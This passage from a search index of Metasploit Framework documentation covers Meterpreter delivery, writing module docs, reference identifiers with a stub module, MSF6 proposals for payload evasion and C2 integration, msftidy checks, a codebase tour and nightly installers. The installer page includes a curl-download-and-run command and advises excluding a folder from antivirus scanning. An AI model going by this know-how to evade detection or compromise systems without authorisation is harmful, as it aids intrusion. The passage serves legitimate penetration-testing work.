    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter.html#architecture",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter.html#architecture"
  },"464": {
    "doc": "Overview",
    "title": "Delivering Meterpreter",
    "content": ". | Using a technique developed by Stephen Fewer called Reflective DLL Injection (RDI), metsrv.dll’s header is modified to be usable as shellcode. From there, Metasploit can embed it in an executable or run it via an exploit like any other shellcode. | . ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter.html#delivering-meterpreter",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter.html#delivering-meterpreter"
  },"465": {
    "doc": "Overview",
    "title": "Overview",
    "content": "Meterpreter is an advanced payload that has been part of Metasploit since 2004. Originally written in C by Matt “skape” Miller, dozens of contributors have provided additional code, including implementations in PHP, Python, and Java. The payload continues to be frequently updated as part of Metasploit development. Meterpreter development occurs in the metasploit-payloads repository and the compiled results are published as part of the metasploit-payloads gem. For a detailed understanding of the Meterpreter architecture, please review the original specification. Additional documentation about Meterpreter can be found on this wiki: . | Meterpreter Reliable Network Communication | Meterpreter Transport Control | Meterpreter HTTP Communication | Meterpreter Timeout Control | Meterpreter Sleep Control | Meterpreter Stageless Mode | Meterpreter Unicode Support | Meterpreter Configuration | Payload UUID | . Extension-specific documentation: . | Python Extension | Powershell Extension | . A wishlist of features is maintained at the Meterpreter Wishlist page. Examples of specific use cases can also be found on this wiki: . | Meterpreter Paranoid Mode | . Those interested in the technical details of Meterpeter, along with rationale behind some of the implementations, should read the following: . | The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers | . Got dead Meterpreter sessions? Read this: Debugging Dead Meterpreter Sessions. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter.html",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter.html"
  },"466": {
    "doc": "Module Documentation",
    "title": "Module Documentation",
    "content": "You can now generate documentation for modules on the fly using the info -d command. Module documentation allows you to see the help for a particular module from a web page, instead of from the command line. The help page includes: . | The PR history related to a particular module, if you have a GitHub access token set up. | The basic usage instructions for a module. | The advanced usage instructions for a module, if it’s available. | . How to use it . After you load a module, you can type info -d to generate a help page that provides basic usage information and displays the PR history for the module. msf&gt; use auxiliary/scanner/smb/smb_login msf (smb_login)&gt; info -d . Additionally, if it’s available, the help page will also include a KB that contains advanced usage information, such as vulnerable target details, caveats, and sample usage. The content in the KB is contained in a markdown file in the metasploit-framework/documentation/modules directory. Its purpose is to provide supplemental information that is outside of the scope of general documentation. Add an access token to see PR history . In order for you to be able to view the PR history for a module, you’ll need add your GitHub access token to the environment variable GITHUB_OAUTH_TOKEN=\"&lt;your token here&gt;\" in .bash_profile. To generate a GitHub access token, check out this page. The token will need to have a scope for repos. How you can write KBs . Generally, the person who creates the module will write the initial KB for it, but anyone can write or contribute to it. Before you write a KB, you should take a look at the sample template, module_doc_template.md, or take a look at any of the KBs that are already available. To write a KB, you’ll need to: . | Create an markdown (.md) file. | Write the content. | Save the file and name it after the module name. For example, the filename for ms08_067_netapi.rb is called ms08_067_netapi.md. | Place it in the metasploit-framework/documentation/modules directory as directed below. | . Where to put the KB files . If you go to metasploit-framework/documentation/modules, you’ll see that there are documentation directories for each module type: auxiliary, exploit, payload, and post. To figure out where you need to put the file, you’ll need to look at the module name. | Start msfconsole. | Type use &lt;module name&gt;. | Type info. | When the module name appears, look at the Module field. You’ll see a file path for the module. That’s the path where the KB needs to be added. | . For example: . msf&gt; use auxiliary/scanner/smb/smb_login msf (smb_login)&gt; info Name: SMB Login Check Scanner Module: auxiliary/scanner/smb/smb_login .... If you were creating a KB for the smb login scanner, you’d add it to metasploit-framework/documentation/modules/auxiliary/scanner/smb. Sections you should include in the KB . These are just suggestions, but it’d be nice if the KB had these sections: . | Vulnerable Applications - Tells users what targets (version numbers) are vulnerable to the module and provides instructions on how to access vulnerable targets for testing. If possible provide a download link and any setup instructions to configure the software appropriately. | Verification Steps - Tells users how to use the module and what the expected results are from running the module. | Options - Provides descriptions of all the options that can be run with the module. Additionally, clearly identify the options that are required. | Scenarios - Provides sample usage and describes caveats that the user may need to be aware of when running the module. Include the version number and OS so that this setup can be replicated at a later date. | . ",
    "url": "/docs/using-metasploit/basics/module-documentation.html",
    "relUrl": "/docs/using-metasploit/basics/module-documentation.html"
  },"467": {
    "doc": "Module Reference Identifiers",
    "title": "On this page",
    "content": ". | List of supported reference identifiers | Code example of references in a module | . A reference in a Metasploit module is a source of information related to the module. This can be a link to the vulnerability advisory, a news article, a blog post about a specific technique the module uses, a specific tweet, etc. The more you have the better. However, you should not use this as a form of advertisement. ",
    "url": "/docs/development/developing-modules/module-metadata/module-reference-identifiers.html#on-this-page",
    "relUrl": "/docs/development/developing-modules/module-metadata/module-reference-identifiers.html#on-this-page"
  },"468": {
    "doc": "Module Reference Identifiers",
    "title": "List of supported reference identifiers",
    "content": "| ID | Source | Code Example | . | CVE | cvedetails.com | ['CVE', '2014-9999'] | . | CWE | cwe.mitre.org | ['CWE', '90'] | . | BID | securityfocus.com | ['BID', '1234'] | . | MSB | technet.microsoft.com | ['MSB', 'MS13-055'] | . | EDB | exploit-db.com | ['EDB', '1337'] | . | US-CERT-VU | kb.cert.org | ['US-CERT-VU', '800113'] | . | ZDI | zerodayinitiative.com | ['ZDI', '10-123'] | . | WPVDB | wpvulndb.com | ['WPVDB', '7615'] | . | PACKETSTORM | packetstormsecurity.com | ['PACKETSTORM', '132721'] | . | URL | anything | ['URL', 'http://example.com/blog.php?id=123'] | . | AKA (deprecated*) | anything | ['AKA', 'shellshock'] | . Good to know AKA names for modules are no longer stored as a reference identifier, but rather in the Notes metadata field as shown in the example below. ",
    "url": "/docs/development/developing-modules/module-metadata/module-reference-identifiers.html#list-of-supported-reference-identifiers",
    "relUrl": "/docs/development/developing-modules/module-metadata/module-reference-identifiers.html#list-of-supported-reference-identifiers"
  },"469": {
    "doc": "Module Reference Identifiers",
    "title": "Code example of references in a module",
    "content": "require 'msf/core' class MetasploitModule &lt; Msf::Exploit::Remote Rank = NormalRanking def initialize(info={}) super(update_info(info, 'Name' =&gt; \"Code Example\", 'Description' =&gt; %q{ This is an example of a module using references }, 'License' =&gt; MSF_LICENSE, 'Author' =&gt; [ 'Unknown' ], 'References' =&gt; [ [ 'CVE', '2014-9999' ], ['BID', '1234'], ['URL', 'http://example.com/blog.php?id=123'] ], 'Platform' =&gt; 'win', 'Targets' =&gt; [ [ 'Example', { 'Ret' =&gt; 0x41414141 } ] ], 'Payload' =&gt; { 'BadChars' =&gt; \"\\x00\" }, 'Privileged' =&gt; false, 'DisclosureDate' =&gt; \"Apr 1 2014\", 'DefaultTarget' =&gt; 0, 'Notes' =&gt; { 'AKA' =&gt; [ 'shellshock' ] } )) end def exploit print_debug('Hello, world') end end . ",
    "url": "/docs/development/developing-modules/module-metadata/module-reference-identifiers.html#code-example-of-references-in-a-module",
    "relUrl": "/docs/development/developing-modules/module-metadata/module-reference-identifiers.html#code-example-of-references-in-a-module"
  },"470": {
    "doc": "Module Reference Identifiers",
    "title": "Module Reference Identifiers",
    "content": " ",
    "url": "/docs/development/developing-modules/module-metadata/module-reference-identifiers.html",
    "relUrl": "/docs/development/developing-modules/module-metadata/module-reference-identifiers.html"
  },"471": {
    "doc": "MSF6 Feature Proposals",
    "title": "Payloads and Post-exploitation",
    "content": "Meterpreter Transport and Scalability Overhaul . The Meterpreter Protocol “TLV” is enhanced to support modern features such as logging, unidirectional messages, obfuscation, sequence number reassembly and more. This feature will enable Meterpreter sessions to be more robust, faster, and evade detection with greater ease than before. Additionally, Meterpreter payload listeners, rather than being integrated straight into msfconsole, will run as an independent process that communicates with msfconsole (1 or more users) over RPC similar to the msfdb_ws (Metasploit Database Web Service). The external listener then replaces the ‘metasploit-aggregator’ project by not requiring an intermediate proxy to park or share sessions, these are done directly by having the listeners independent of console users. Listener capabilities be embeddable directly into Meterpreter payloads, allowing local listeners and remote listeners internal to other networks could be implemented the same way, enabling greater scalability and facilitating pivoting across more complex networks, allowing better post-exploitation possibilities in modern network environments. Integration with external C2 frameworks . If listeners are externalized, then there is an API layer both for interactive interaction with remote sessions, and a way for the Post-exploitation API to communicate with the external sessions. That should mean that if an external C2 framework supports at minimum shell interaction, a bulk of the Post-exploitation API should be applicable against external C2 frameworks as well. Metasploit would then be able to integrate both with other open-source C2 frameworks, as well as private ones. Integration of native tool-chains . Tools like Veil, pwnlib, etc. have for a long time used native compilers and tooling to build payloads and evasions. Metasploit has opted mostly for native Ruby solutions, though it does have some implicit runtime dependencies like apktool for Android payload injection. However, these tools are getting harder to maintain and use (e.g. metasm has a diffcult time building any non-trivial C code, we just spent a month fixing a bug it had with Ruby 2.5 and Windows). It would be nice to have either be able to depend on a set of first-class toolchains being available in the environment, or have some way to package them natively with Metasploit itself. A full suite of compilers and tools does consume considerable amounts of space (e.g. mettle’s toolchain is 1.8GB uncompressed), but this is probably less of a problem than it was 15 years ago. Native first-class UUID-aware, async stager payload . Make a new async payload type (based on pingback payload work) making secure comms, endpoint verification, and async communication first-class citizens, and on by default. These session types would support a much more limited set of actions than Meterpreter, only supporting sleep/upload/download/stage, but would be upgraded to Meterpreter directly as-needed (maybe even transparently). Network protocols can be much more exotic for this, and the listener/payload should be usable externally from Metasploit as well. Todo: pull in async payload proposal notes from @bwatters-r7. ",
    "url": "/docs/development/propsals/msf6-feature-proposals.html#payloads-and-post-exploitation",
    "relUrl": "/docs/development/propsals/msf6-feature-proposals.html#payloads-and-post-exploitation"
  },"472": {
    "doc": "MSF6 Feature Proposals",
    "title": "Module Interface",
    "content": "Overhaul network targeting . Setting at least 5 variables RHOSTS/RPORT/SSL/VHOST/SSL_Version/User/Pass/etc… to target a single web application is very cumbersome. When these variables also do not apply to multiple RHOSTS exactly, the scheme of multiple variables falls apart futher. Metasploit should be able to target URLs directly, that can all have their own independent ports, users, hostnames, etc: . set TARGETS https://user:password@target_app:4343 https://target_app2 . Overhaul credential targeting . The credential datastore options also has many different co-dependent and independent variables, which are confusing and awkward to use. In addition, there is little in the way of user-parallelism for using login scanners against single-service web apps. MSF6 should have an easier less messy overhaul of targeting multiple users and apps as well. Maybe TARGETS could be used the same way? . Collapse module types, expose module ‘abilities’ or ‘methods’ instead . Modules in Metasploit are classified according to what they can do (‘exploits can exploit, scanners can scan’) but often its useful to be able to scan for exploitable targets. Workarounds include reaching between modules and sharing library code and mixins. This proposal suggests that ‘exploit’ and ‘scanner’, as well as many other aux-type modules should collapse into a single module type. They simply expose capabilities like ‘scan’, ‘check’, ‘exploit’, etc. and a single module can do all of these. Additionally, ‘admin’ modules could be collapsed. For instance, why have a chromecast_reset and chromecast_youtube module when you can use ‘admin/chromecast’ and just type ‘cast’ or ‘reset’ as methods on this single module. This would also replace the ‘ACTIONS’ datastore option where they are used in multi-action aux modules. Integration with external exploitation frameworks . E.g. could we just use routersploit or wpsploit directly from within framework and gather loot/run post exploitation, etc. through them? Maybe using the external module RPC, just being able to expose multiple modules behind the same API? . Changing module structure on disk . Currently a non-trivial exploit module will require adding code to 4 different subdirectories (lib, modules, documentation, external) which makes it both hard to follow all of the moving pieces, but also makes it harder to extract modules for independent use. See Bundled Modules Proposal for a more detailed proposal. ",
    "url": "/docs/development/propsals/msf6-feature-proposals.html#module-interface",
    "relUrl": "/docs/development/propsals/msf6-feature-proposals.html#module-interface"
  },"473": {
    "doc": "MSF6 Feature Proposals",
    "title": "Data Model",
    "content": "Temporal / log-oriented data model . Metasploit implements a standard Ruby-on-Rails CRUD model for storing data about an environment. A Host object is created, updated, deleted, etc. But, anything can update anything, making it easy to lose data, and hard to notice changes over time. A workaround is religious use of workspaces to segregate observations, but that’s more of a workaround. A log-structured data model (observations about hosts/loot/credentials/services, etc.) should just be objects that are imported into a datastore that prioritizes search over everything else. Relationships between objects should be loose and maleable, as the way the graph of how objects are related can and does change over time in modern environments, often on the order of hours or minutes. As a concrete example, say every report_* method just wrote a JSON blob into elasticsearch. Then you would have first observed data, and when something else happens, say a password is cracked, rather than modifying a credential object, there would just be an enrichment object added to the data store, and both could be matched together later. The current data model also often doesn’t have ways of storing arbitrary information from modules that need it; loot is often used as a workaround, but it’s not searchable by content. Providing a way to store arbitrary JSON from modules would allow the flexibility to store anything, search for anything, and to never lose anything. Also, services would be removable as well from the database when a service is down. Note: a temporal data model will likely need something better able to show data relations than the current tabular rex-table approach in msfconsole. Web UI? . Data model is always available . The database in Metasploit has historically been optional. Not everyone needs to store data and setting up and maintaining the database is often a burden to the user, with many possible failure modes. Having the data model not always be available often complicates Metasploit’s code, and made some features like UUID tracking for payloads difficult to implement reliably. Metasploit 5 added web services for the data mode, which further complicated the code paths, adding a third way for behavior to possibly differ. We should make a light-weight in-memory database service that can run automatically if a persistent database is unavailable or unconfigured, which can always provide some sort of database service to Metasploit, even if it is ephemeral and exits when msfconsole/listeners, etc. have exited. framework.db should always exist, even if the data it stores goes into a temporary bit bucket. Then all of the conditional code paths can go away. ",
    "url": "/docs/development/propsals/msf6-feature-proposals.html#data-model",
    "relUrl": "/docs/development/propsals/msf6-feature-proposals.html#data-model"
  },"474": {
    "doc": "MSF6 Feature Proposals",
    "title": "Infrastructure",
    "content": "First class user-oriented documentation . Provide a means for the community to document changes to how Metasploit works (developer and user), unify various documentation resources. Make Metasploit Higher-performance / lighter weight . As subcomponents get carved off (external database service, external listeners), they should be implemented in a lighter weight way. We have some prototypes of the database web service rewritten in golang, and a persistent payload generation service that can be used my a client-only msfvenom-like tool can speed up execution considerably. Sunsetting, separation of old module / code . Metasploit has some really old modules that probably don’t get used very often. Can we segregate these or sunset them so that the overall number of modules is reduced? . Integration of separate Metasploit projects into fewer repos (rex / payloads / metasploit data models) . Metasploit is spread out across over a dozen different repos. Let’s merge them as much as we can to make it easier to change them across the board (e.g. when changing the data model) and to make it easier to have parallel branches for stable/unstable work. ",
    "url": "/docs/development/propsals/msf6-feature-proposals.html#infrastructure",
    "relUrl": "/docs/development/propsals/msf6-feature-proposals.html#infrastructure"
  },"475": {
    "doc": "MSF6 Feature Proposals",
    "title": "MSF6 Feature Proposals",
    "content": "List of potential major features (things that would make major breaking changes) for MSF6: . ",
    "url": "/docs/development/propsals/msf6-feature-proposals.html",
    "relUrl": "/docs/development/propsals/msf6-feature-proposals.html"
  },"476": {
    "doc": "Msftidy",
    "title": "Description",
    "content": " ",
    "url": "/docs/development/quality/msftidy.html#description",
    "relUrl": "/docs/development/quality/msftidy.html#description"
  },"477": {
    "doc": "Msftidy",
    "title": "Checks",
    "content": " ",
    "url": "/docs/development/quality/msftidy.html#checks",
    "relUrl": "/docs/development/quality/msftidy.html#checks"
  },"478": {
    "doc": "Msftidy",
    "title": "File modes",
    "content": "This check ensures that modules are not marked executable. A module is only called by the framework and not directly. The correct file mode is 0644, which will ensure that other users are only able to read the file, and that the current user is only able to read and write the file, not execute it. ",
    "url": "/docs/development/quality/msftidy.html#file-modes",
    "relUrl": "/docs/development/quality/msftidy.html#file-modes"
  },"479": {
    "doc": "Msftidy",
    "title": "Shebang",
    "content": "A module should not have a Shebang line. ",
    "url": "/docs/development/quality/msftidy.html#shebang",
    "relUrl": "/docs/development/quality/msftidy.html#shebang"
  },"480": {
    "doc": "Msftidy",
    "title": "Nokogiri",
    "content": "Modules should not rely on the Nokogiri GEM. Please use REXML instead. ",
    "url": "/docs/development/quality/msftidy.html#nokogiri",
    "relUrl": "/docs/development/quality/msftidy.html#nokogiri"
  },"481": {
    "doc": "Msftidy",
    "title": "Invalid Formats",
    "content": "CVE . CVE references should be in the format YYYY-NNNN . BID . BID references should only contain numbers . MSB . OSVDB references should be in the format MSddd-ddd (d = digit) . MIL . Milw0rm references are no longer supported (site suspended) . EDB . EDB references should only contain numbers . US-CERT-VU . US-CERT references should only contain numbers . ZDI . ZDI references should be in the format dd-ddd or dd-dddd (d = digit) . URL . If you supply an URL where a short identifier is available, please use the identifier. ",
    "url": "/docs/development/quality/msftidy.html#invalid-formats",
    "relUrl": "/docs/development/quality/msftidy.html#invalid-formats"
  },"482": {
    "doc": "Msftidy",
    "title": "Old Keywords",
    "content": "Before Metasploit moved to Github the sources were stored in a SVN repository. SVN has support to replace custom variables with current values like the last revision. Since GIT does not support them, the references should be removed from code. ",
    "url": "/docs/development/quality/msftidy.html#old-keywords",
    "relUrl": "/docs/development/quality/msftidy.html#old-keywords"
  },"483": {
    "doc": "Msftidy",
    "title": "Verbose",
    "content": "You should not define a VERBOSE option in your module. A VERBOSE option is already provided by the framework. To make use of the VERBOSE setting, you can use methods like vprint_status and vprint_error . ",
    "url": "/docs/development/quality/msftidy.html#verbose",
    "relUrl": "/docs/development/quality/msftidy.html#verbose"
  },"484": {
    "doc": "Msftidy",
    "title": "Badchars",
    "content": "This checks looks for bad characters in the module title. If you encounter this error, please replace the characters. ",
    "url": "/docs/development/quality/msftidy.html#badchars",
    "relUrl": "/docs/development/quality/msftidy.html#badchars"
  },"485": {
    "doc": "Msftidy",
    "title": "File Extension",
    "content": "All modules should have a .rb file extension to be loaded by the framework. ",
    "url": "/docs/development/quality/msftidy.html#file-extension",
    "relUrl": "/docs/development/quality/msftidy.html#file-extension"
  },"486": {
    "doc": "Msftidy",
    "title": "Old Rubies",
    "content": "This check checks the file for syntax errors with old Ruby versions. By default this check will not run. To execute this check you need to set the environment variable MSF_CHECK_OLD_RUBIES. ",
    "url": "/docs/development/quality/msftidy.html#old-rubies",
    "relUrl": "/docs/development/quality/msftidy.html#old-rubies"
  },"487": {
    "doc": "Msftidy",
    "title": "Ranking",
    "content": "This check ensures you added the correct Exploit Ranking to your module. ",
    "url": "/docs/development/quality/msftidy.html#ranking",
    "relUrl": "/docs/development/quality/msftidy.html#ranking"
  },"488": {
    "doc": "Msftidy",
    "title": "Disclosure Date",
    "content": "Date format needs to be Month Day, YYYY. Example: Jan 01, 2014 . ",
    "url": "/docs/development/quality/msftidy.html#disclosure-date",
    "relUrl": "/docs/development/quality/msftidy.html#disclosure-date"
  },"489": {
    "doc": "Msftidy",
    "title": "Title Casing",
    "content": "This check ensures you used the correct case in your title. ",
    "url": "/docs/development/quality/msftidy.html#title-casing",
    "relUrl": "/docs/development/quality/msftidy.html#title-casing"
  },"490": {
    "doc": "Msftidy",
    "title": "Bad Terms",
    "content": "This checks for the correct use of the terms Stack Buffer overflow and Stack Exhaustion. See “Stack exhaustion” vs “Stack buffer overflow” for more information. ",
    "url": "/docs/development/quality/msftidy.html#bad-terms",
    "relUrl": "/docs/development/quality/msftidy.html#bad-terms"
  },"491": {
    "doc": "Msftidy",
    "title": "Function Arguments",
    "content": "If you define a function which defines a lot of input arguments, the check ensures you use a hash instead. ",
    "url": "/docs/development/quality/msftidy.html#function-arguments",
    "relUrl": "/docs/development/quality/msftidy.html#function-arguments"
  },"492": {
    "doc": "Msftidy",
    "title": "Line Check",
    "content": "Unicode . Your module must not contain Unicode characters. Spaces at EOL . Your module must not contain spaces at the end of a line. Mixed Tab Spaces . Your module contains Tabs and Spaces in one line. Only spaces should be used . Tabs . Your module should not use tabs for intending code. Please use spaces instead. Carriage return . The specified line only contains a carriage return (\\r) at the end of line. Please change to a normal linebreak (\\n or \\r\\n). File.open . You used a File.open call without specifying a binary mode??? . Load . You used the load command in your module. This is not required since the framework loads all necessary files for you. STDOUT . Modules should not write directly to stdout. Please use the print_* functions instead. Modified datastore . Datastore options (options set by the user) should not be modified in code. If you need to change some values use local variables instead. Set-Cookie . The Set-Cookie header should not be parsed by your code. You can use the API call res.get_cookies insteady which already handles some special cases and ensures a clean header. Auxiliary Rand . Auxiliary modules should have no Rank. Only Exploits and Payloads should have a Rank attribute. ",
    "url": "/docs/development/quality/msftidy.html#line-check",
    "relUrl": "/docs/development/quality/msftidy.html#line-check"
  },"493": {
    "doc": "Msftidy",
    "title": "Snake Case",
    "content": "This check ensures your module filename is in Snake Case . ",
    "url": "/docs/development/quality/msftidy.html#snake-case",
    "relUrl": "/docs/development/quality/msftidy.html#snake-case"
  },"494": {
    "doc": "Msftidy",
    "title": "Old License",
    "content": "This check checks for the old Metasploit license in the module header. You can use the tool ruby tools/dev/resplat.rb &lt;filename&gt; to convert the file. ",
    "url": "/docs/development/quality/msftidy.html#old-license",
    "relUrl": "/docs/development/quality/msftidy.html#old-license"
  },"495": {
    "doc": "Msftidy",
    "title": "VULN Codes",
    "content": "This check ensures only known CheckCodes are returned by the check function. ",
    "url": "/docs/development/quality/msftidy.html#vuln-codes",
    "relUrl": "/docs/development/quality/msftidy.html#vuln-codes"
  },"496": {
    "doc": "Msftidy",
    "title": "vars_get",
    "content": "When using send_request_cgi or send_request_raw the URL supplied should not contain GET Parameter. Please provide the Parameter via the vars_get hash. bad: . res = send_request_raw({ 'uri' =&gt; uri_base + '/upload.php?type=file&amp;folder=' + folder }) . good: . res = send_request_raw({ 'uri' =&gt; uri_base + '/upload.php', 'vars_get' =&gt; { 'type' =&gt; 'file', 'folder' =&gt; folder } }) . ",
    "url": "/docs/development/quality/msftidy.html#vars_get",
    "relUrl": "/docs/development/quality/msftidy.html#vars_get"
  },"497": {
    "doc": "Msftidy",
    "title": "Msftidy",
    "content": " ",
    "url": "/docs/development/quality/msftidy.html",
    "relUrl": "/docs/development/quality/msftidy.html"
  },"498": {
    "doc": "Navigating the codebase",
    "title": "Metasploit Code Structure",
    "content": "A great outline of Metasploit’s code structure can be found at https://www.offensive-security.com/metasploit-unleashed/metasploit-architecture/, which should be referred to for an overview of Metasploit’s code structure. To repeat what is said there there are the following main subdirectories: . | data - Our general data storage area. Used to store wordlists for use by modules, binaries that are used by exploits, images, and more. | db - Holds the Metasploit module database information. The modules_metadata_base.json file here gets updated every time a new module is pushed into the framework or the properties of one gets updated, so that Metasploit can do things like autocompleting module names. | docker - Files related to building a docker instance of Metasploit Framework. | documentation - This is the documentation directory. Every module that has been landed within the last 3-4 years is required to have documentation along with the exploit code. You may find older exploits do not have documentation; if you’d like to help out with this we have an open task at https://github.com/rapid7/metasploit-framework/issues/12389 for adding missing documentation to some auxiliary modules. | external - Used as a storage area for the source code of the binaries that modules might depend on, as well as burpsuite, zsh tab completion, and a Metasploit specific fork of the serialport project. | lib - Where all the library code goes. If your working on something that could affect multiple modules, that code will likely be contained in a library stored under this directory. | modules - All modules are stored under this directory, and are further broken down into several categories. | modules/exploit - Stores exploit modules which generally tend to gain you a shell of some sort. | modules/auxiliary - Stores auxiliary modules, which are used to gain information and generally don’t gain a shell. | modules/post - Stores post modules which perform useful actions after one has gained access to a target. | modules/encoders - Stores encoder modules which are used to encode various payloads to help avoid bad characters or provide additional obfuscation. | modules/evasion - Stores evasion modules which are used to help avoid antivirus. | modules/nops - Stores NOP modules used for generating NOP shellcode for various architectures. | plugins - Used for storing various Metasploit plugins that allow Metasploit to integrate with other programs or import data from other programs. | scripts - Stores various scripts used within Metasploit, such as Meterpreter, and scripts for the console interface of Metasploit Framework. | spec - Contains various RSpec checks that are used to ensure libraries and core functionality within the framework are working as expected. If you are writing a new library or adjusting one, you may need to update the corresponding RSpec file within this directory to ensure the specification checks are updated to reflect the new behavior. | test - Contains tests for various parts of Metasploit code to ensure they are operating as expected. | tools - Contains various tools that may be helpful under different situations. The dev directory contains tools useful during development, such as tools/dev/msftidy_docs.rb which helps ensure your documentation is in line with standards. | . ",
    "url": "/docs/development/get-started/navigating-and-understanding-metasploits-codebase.html#metasploit-code-structure",
    "relUrl": "/docs/development/get-started/navigating-and-understanding-metasploits-codebase.html#metasploit-code-structure"
  },"499": {
    "doc": "Navigating the codebase",
    "title": "GitHub Code Navigation",
    "content": "You can search through the code of Metasploit using GitHub with searches such as https://github.com/rapid7/metasploit-framework/search?l=Ruby&amp;q=%22payload.arch%22&amp;type=code. Note that double quotes are required to match specifically on a certain term; in the previous example this term was payload.arch. You can also set the type=code parameter to specifically match only on code results, however this can be set to commits or issues if you want to search commits or issues instead. Finally notice that when searching code, its important to also specify the language of the files you want to match. In the case above I made it so that my results would only match on files deemed by GitHub to contain Ruby code, however you can also specify other languages such as Batch, or C if you want those languages instead. You can even remove the language restriction if you find your search results are too narrow. Another incredibly useful feature of GitHub is the ability to search across all repositories that an organization owns. This is especially useful in Metasploit as certain components, such as Rex code and payload code, may be contained in repositories other than metasploit-framework. To search across the public repositories that Rapid7 owns, use a search such as https://github.com/search?q=org%3Arapid7+%22payload.arch%22&amp;type=code. Note the presence of the org:rapid7 tag within the previous URL: this tells GitHub to look through all repositories that Rapid7 owns for the term payload.arch within any code files. Experiment with these results and play around with GitHub searches more. Over time you will learn where it is useful and where it has its limitations and will be able to determine when it might be better to use an IDE to help understand a piece of code more. ",
    "url": "/docs/development/get-started/navigating-and-understanding-metasploits-codebase.html#github-code-navigation",
    "relUrl": "/docs/development/get-started/navigating-and-understanding-metasploits-codebase.html#github-code-navigation"
  },"500": {
    "doc": "Navigating the codebase",
    "title": "IDE Code Navigation",
    "content": "One of the best ways to navigate the codebase within Metasploit is to use RubyMine, available from https://www.jetbrains.com/ruby/. Whilst it is a paid tool, it offers a variety of neat referencing finding features such as the ability to right click on a method name and select Find Usages, or to right click the method name and select Go To -&gt; Declaration or Usages to find all the locations where that method might of been defined within the codebase, which can make tracing complex definitions that wind between library and module code much easier. RubyMine also offers autocompletion and integrates well with many tools such as Git to allow you to quickly switch branches and RuboCop to help provide suggestions on where your code style could be improved. For a cheaper option one can also use VS Code. Note however that VS Code does not have the best autotab completion and will not allow you to trace references, however if your willing to put up with this, it is a much faster and more lightweight product than RubyMine, which makes it great for those times when you just need to edit a piece of code without loading a bunch of related files that you don’t need to reference or edit. It also has great regex search features that work much faster than RubyMine, allowing you to search for items within the codebase a lot quicker than you can with RubyMine, which will often seem to stutter at times due to its larger overhead. Ultimately though the tool that you pick should be up to you. Some may prefer to work with vim/nano/emacs or some other command line editor over a GUI interface. Use whatever you can afford and feels comfortable to you! . ",
    "url": "/docs/development/get-started/navigating-and-understanding-metasploits-codebase.html#ide-code-navigation",
    "relUrl": "/docs/development/get-started/navigating-and-understanding-metasploits-codebase.html#ide-code-navigation"
  },"501": {
    "doc": "Navigating the codebase",
    "title": "Pry Debugging",
    "content": "Occasionally, simply reading through Metasploit code may not be helpful. You need to actually get into the weeds and learn what a piece of code is doing. In these cases, it may be helpful to use pry, a Ruby Debugger that can be launched at a specific place within your code and which allows you to view the state of the program at that time, make adjustments as needed, and then either step through the program or continue to let it run. A full tutorial on Pry will not be provided here, instead readers are encouraged to read up on the various guides on Pry available online, such as https://learn.co/lessons/debugging-with-pry . ",
    "url": "/docs/development/get-started/navigating-and-understanding-metasploits-codebase.html#pry-debugging",
    "relUrl": "/docs/development/get-started/navigating-and-understanding-metasploits-codebase.html#pry-debugging"
  },"502": {
    "doc": "Navigating the codebase",
    "title": "Navigating the codebase",
    "content": "One of the most important things to learn when first working with Metasploit is how to navigate Metasploit’s codebase. However, its often not immediately clear how this should be done. This page aims to explain some of the different approaches that one can take when navigating Metasploit’s codebase and provides a primer for learning how Metasploit’s codebase is structured. A quick reminder before we get started, but one can always access the Metasploit Slack at https://metasploit.slack.com/. Normally this page should allow you to sign up, however if for any reason you cannot, feel free to shoot an email to msfdev at rapid7 dot com and we will be happy to send you an invite link. ",
    "url": "/docs/development/get-started/navigating-and-understanding-metasploits-codebase.html",
    "relUrl": "/docs/development/get-started/navigating-and-understanding-metasploits-codebase.html"
  },"503": {
    "doc": "Nightly Installers",
    "title": "Installing Metasploit on Linux / macOS",
    "content": "The following script invocation will import the Rapid7 signing key and setup the package for supported Linux and macOS systems: . curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \\ chmod 755 msfinstall &amp;&amp; \\ ./msfinstall . Once installed, you can launch msfconsole as /opt/metasploit-framework/bin/msfconsole from a terminal window, or depending on your environment, it may already be in your path and you can just run it directly. On first run, a series of prompts will help you setup a database and add Metasploit to your local PATH if it is not already. These packages integrate into your package manager and can be updated with the msfupdate command, or with your package manager. On first start, these packages will automatically setup the database or use your existing database. Linux manual installation . Linux packages are built nightly for .deb (i386, amd64, armhf, arm64) and .rpm (64-bit x86) systems. Debian/Ubuntu packages are available at https://apt.metasploit.com and CentOS/Redhat/Fedora packages are located at https://rpm.metasploit.com. macOS manual installation . The latest OS X installer package can also be downloaded directly here: https://osx.metasploit.com/metasploitframework-latest.pkg, with the last 10 builds archived at https://osx.metasploit.com/. Simply download and launch the installer to install Metaploit Framework with all of its dependencies. ",
    "url": "/docs/using-metasploit/getting-started/nightly-installers.html#installing-metasploit-on-linux--macos",
    "relUrl": "/docs/using-metasploit/getting-started/nightly-installers.html#installing-metasploit-on-linux--macos"
  },"504": {
    "doc": "Nightly Installers",
    "title": "Installing Metasploit on Windows",
    "content": "Download the latest Windows installer or view older builds. To install, simply download the .msi package, adjust your Antivirus as-needed to ignore c:\\metasploit-framework, double-click and enjoy. The msfconsole command and all related tools will be added to the system %PATH% environment variable. Windows Anti-virus software flags the contents of these packages! . If you downloaded Metasploit from us, there is no cause for alarm. We pride ourselves on offering the ability for our customers and followers to have the same toolset that the hackers have so that they can test systems more accurately. Because these (and the other exploits and tools in Metasploit) are identical or very similar to existing malicious toolsets, they can be used for nefarious purposes, and they are often flagged and automatically removed by antivirus programs, just like the malware they mimic. ",
    "url": "/docs/using-metasploit/getting-started/nightly-installers.html#installing-metasploit-on-windows",
    "relUrl": "/docs/using-metasploit/getting-started/nightly-installers.html#installing-metasploit-on-windows"
  },"505": {
    "doc": "Nightly Installers",
    "title": "Improving these installers",
    "content": "Feel free to review and help improve the source code for our installers. ",
    "url": "/docs/using-metasploit/getting-started/nightly-installers.html#improving-these-installers",
